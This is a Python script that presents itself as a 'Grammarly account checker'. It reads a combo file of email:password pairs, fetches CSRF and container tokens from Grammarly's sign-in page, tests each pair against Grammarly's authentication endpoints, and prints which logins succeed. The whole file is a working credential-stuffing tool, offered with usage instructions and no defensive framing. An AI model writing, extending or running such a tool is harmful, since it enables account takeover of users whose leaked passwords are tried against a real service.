import requests
import json
import getopt
import sys
import os

# terminal colors
C = '\033[96m'  # cyan
G = '\033[92m'  # green
W = '\033[93m'  # warning color ( yellow)
R = '\033[91m'  # red
E = '\033[0m'   # end of colorizing (after this, termianl colors will be normal)

def check_account(email, password):  # this function will return True of False
    url = 'https://www.grammarly.com/signin'
    auth_url = 'https://auth.grammarly.com/v3/auth/info'
    login_url = 'https://auth.grammarly.com/v3/api/login'
    head1 = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36'
    }
    s = requests.Session()
    r = s.get(url, headers=head1)
    head2 = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
        'Referer': 'https://www.grammarly.com/signin',
        'Accept': 'application/json',
        'x-container-id': r.cookies['gnar_containerId'],
        'x-csrf-token': r.cookies['csrf-token']
    }
    data = {'email': email}
    r = s.post(auth_url, json=data, headers=head2)
    veryfiy_responce = json.loads(r.text)
    if veryfiy_responce['accountExists'] == False:
        return False
    if veryfiy_responce['accountExists'] == True and veryfiy_responce['loginType'] == 'EMAIL':
        log_data = {'email_login':
            {
                "email": email,
                "password": password,
                "secureLogin": 'false'
            }
        }
        r = s.post(login_url, json=log_data, headers=head2)
        if r.status_code == 401:
            return False
        elif r.status_code == 200:
            return True
        else:
            print(R + r.status_code + E + '\n\n')
            return False
    else:
        return False

def show_help():
    print('Grammarly account checker:\n\t-f(--file)\tcombo file(Email & Password list)\n'
          '\t\t\tNOTICE: email and password separator is colon(:)\n\t-h(--help)\t \n\tExample:\n\t\tpython grammarly-checker.py -f combo.txt')
try:
    # getting terminal args passed by user
    options , args = getopt.getopt(sys.argv[1:], 'hf:' , longopts=['help','file='])
    if options:
        if len(options) == 2:
            show_help()  # TODO -> help function
            sys.exit()
        elif options[0][0] in ['-h','--help']:
            show_help()
            sys.exit()
        elif options[0][0] in ['-f', '--file']:
            path = os.getcwd() + '/' + options[0][1]
            if os.path.isfile(path):
                with open(path) as f:
                    for i in f:
                        i = i.strip()
                        i = i.split(':')  # email and password separator
                        email = i[0]
                        password = i[1]
                        if check_account(email, password):
                            print(G + 'Login was successfull.' + W + '(' + C + email + R + ':' + C + password + W + ')' + E)
                        else:
                            print(R + 'Login Faild.' + W + '(' + C + email + R + ':' + C + password + W + ')' + E)
            else:
                print(R + 'File not found.' + E)
                sys.exit()
    sys.exit()
except getopt.GetoptError:
    print('Invalid Argument:\n\tTry: --help')

